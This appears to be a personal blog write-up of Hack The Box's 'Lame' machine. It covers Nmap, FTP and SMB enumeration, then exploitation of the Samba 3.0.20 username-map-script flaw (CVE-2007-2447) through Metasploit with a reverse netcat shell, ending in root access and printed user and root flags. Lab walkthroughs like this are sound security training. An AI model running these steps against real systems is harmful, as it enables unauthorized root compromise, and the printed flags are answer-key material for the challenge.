---
title: HackTheBox - Lame WriteUp
date: 2025-07-15 14:37:00 +/-0100
categories: [Machines] 
tags: [CTF,HackTheBox, CVE]
image: /assets/img/Machines/Lame/Lame.png  # SIZE 1200:630
description: 
    This post documents my walkthrough of the Lame machine from Hack The Box. It involves basic enumeration, exploitation of a Samba vulnerability.
---

## Enumeration

### Port Scanning
We begin by performing an Nmap scan to identify open ports and services running on the target machine.

```bash
┌──(krakenn㉿Phoenix)-[~/CPTS/Boxes/Lame/Nmap]                                                                                                                                                                                             
└─$ sudo nmap -Pn -n -sV -sC -A -T4 10.10.10.3 -oA Default-Nmap                                                                                                                                                                            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 19:40 +01                                                                                                                                                                            
Nmap scan report for 10.10.10.3                                                                                                                                                                                                            
Host is up (0.052s latency).                                                                                                                                                                                                               
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.10
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|WAP|remote management|webcam|printer
Running (JUST GUESSING): Linux 2.6.X|2.4.X (92%), Belkin embedded (90%), Control4 embedded (90%), Mobotix embedded (90%), Dell embedded (90%), Linksys embedded (90%), Tranzeo embedded (90%), Xerox embedded (90%)
OS CPE: cpe:/o:linux:linux_kernel:2.6.23 cpe:/h:belkin:n300 cpe:/o:linux:linux_kernel:2.6.30 cpe:/h:dell:remote_access_card:5 cpe:/h:linksys:wet54gs5 cpe:/h:tranzeo:tr-cpq-19f cpe:/h:xerox:workcentre_pro_265 cpe:/o:linux:linux_kernel:2.4
Aggressive OS guesses: Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (90%), Control4 HC-300 home controller or Mobotix M22 camera (90%), Dell Integrated Remote Access Controller (iDRAC5) (90%), Dell Integrated Remote Access Contro
ller (iDRAC6) (90%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (90%), Linux 2.4.21 - 2.4.31 (likely embedded) (90%), Linux 2.4.7 (90%), Citrix XenServer 5.5 (Linux 2.6.18) (90%), Linux 2.6.18 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h00m23s, deviation: 2h49m45s, median: 21s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2025-07-14T14:41:38-04:00
```
Valuable Information:

- 21/TCP → `FTP`.  Version: `vsftpd 2.3.4`
- 22/TCP → `SSH`. Version: `OpenSSH 4.7p1`
- 139, 445/TCP → `SMB`. Version: `smbd 3.0.20`
- `FTP anonymous` login is allowed
- Operating System: `Ubuntu`

### Footprinting FTP

Let's try accessing the FTP service using anonymous login:

```bash
┌──(krakenn㉿Phoenix)-[~]
└─$ ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:krakenn): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||9142|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
ftp> pwd
Remote directory: /
```

Nothing was found on the FTP server.

### Footprinting SMB

Similarly, let's try accessing the SMB share using anonymous login.

```bash
┌──(krakenn㉿Phoenix)-[~]                                                  
└─$ smbclient -N -L //10.10.10.3                          
Anonymous login successful                                                                                          
        Sharename       Type      Comment                       
        ---------       ----      -------         
        print$          Disk      Printer Drivers               
        tmp             Disk      oh noes!            
        opt             Disk                                
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful
        Server               Comment
        ---------            -------
        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME

┌──(krakenn㉿Phoenix)-[~]
└─$ smbclient -N //10.10.10.3/tmp                                                                                     
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul 15 00:15:21 2025
  ..                                 DR        0  Sat Oct 31 07:33:58 2020
  5578.jsvc_up                        R        0  Mon Jul 14 19:18:55 2025
  .ICE-unix                          DH        0  Mon Jul 14 19:17:50 2025
  vmware-root                        DR        0  Mon Jul 14 19:18:09 2025
  .X11-unix                          DH        0  Mon Jul 14 19:18:18 2025
  .X0-lock                           HR       11  Mon Jul 14 19:18:18 2025
  vgauthsvclog.txt.0                  R     1600  Mon Jul 14 19:17:48 2025

                7282168 blocks of size 1024. 5386552 blocks available
smb: \> more vgauthsvclog.txt.0 
getting file \vgauthsvclog.txt.0 of size 1600 as /tmp/smbmore.8AlUeh (7.0 KiloBytes/sec) (average 7.0 KiloBytes/sec)
smb: \> more .X0-lock 
getting file \.X0-lock of size 11 as /tmp/smbmore.rykGpE (0.0 KiloBytes/sec) (average 3.5 KiloBytes/sec)
smb: \> 
```

Again, nothing interesting was found.

- Now let's try to search for potential vulnerabilites within the FTP and SMB server.

###  vsftpd 2.3.4 Vulnerability

-  
- A simple google search shows that vsftpd 2.3.4 has a `backdoor that allows command execution`, but this backdoor was `removed on July 3rd, 2011`. → Source : [**HERE**](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/)

### Samba 3.0.20 Vulnerabiltity

```bash
┌──(krakenn㉿Phoenix)-[~]
└─$ searchsploit Samba 3.0.20     
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                        |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit) | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC) | linux_x86/dos/36741.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

#### CVE-2007-2447: Remote Command Injection Vulnerability

- When using the non-default "username map script" configuration option, specifying a username containing shell meta-characters allows attackers to execute arbitrary commands. → Source : [**HERE**](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/) and [**HERE**](https://www.samba.org/samba/security/CVE-2007-2447.html).


## Exploitation

- Let's run Metasploit and use the specific exploit: `Samba 3.0.20 < 3.0.25rc3 - 'Username' map script Command Execution`

```bash
┌──(krakenn㉿Phoenix)-[~]                                                   
└─$ msfconsole                                                     
                                                                   
msf6 > search Samba 3.0.20                                                          
                                                        
Matching Modules                                                                         
================                                                                                                                                    
   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution                                                                                                              
Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script
msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat                    

msf6 exploit(multi/samba/usermap_script) > options                      

Module options (exploit/multi/samba/usermap_script):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.31     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3
rhosts => 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > set lhost tun0
lhost => 10.10.14.10
msf6 exploit(multi/samba/usermap_script) > exploit
[*] Started reverse TCP handler on 10.10.14.10:4444 
[*] Command shell session 1 opened (10.10.14.10:4444 -> 10.10.10.3:33050) at 2025-07-15 00:27:04 +0100
```

The session was opened successfully.  
Now, let's enumerate the target to see if we can find the flags.

```bash
shell 
[*] Trying to find binary 'python' on the target machine
[*] Found python at /usr/bin/python
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary 'bash' on the target machine
[*] Found bash at /bin/bash
id
id
uid=0(root) gid=0(root)
root@lame:/# ls
ls
bin    etc         initrd.img.old  mnt        root  tmp      vmlinuz.old
boot   home        lib             nohup.out  sbin  usr
cdrom  initrd      lost+found      opt        srv   var
dev    initrd.img  media           proc       sys   vmlinuz
root@lame:/# cd /home/
cd /home/
root@lame:/home# ls
ls
ftp  makis  service  user
root@lame:/home# cd makis
cd makis
root@lame:/home/makis# ls
ls
user.txt
root@lame:/home/makis# cat user.txt
cat er.txt
cat: er.txt: No such file or directory
root@lame:/home/makis# cat user.txt
cat user.txt
395c1640b7fd4af3d1c60d9354caecf2
root@lame:/home/makis# cd /root
cd /root
root@lame:/root# ls
ls
Desktop  reset_logs.sh  root.txt  vnc.log
root@lame:/root# cat root.txt
cat root.txt
453bc6ed512160079bc7e6d4b1007a74
root@lame:/root# 
```

- We don’t need to perform privilege escalation because we already have root access.

- user flag → `395c1640b7fd4af3d1c60d9354caecf2`  
- root flag → `453bc6ed512160079bc7e6d4b1007a74`

# Mission complete

![alt text](../assets/Done.gif)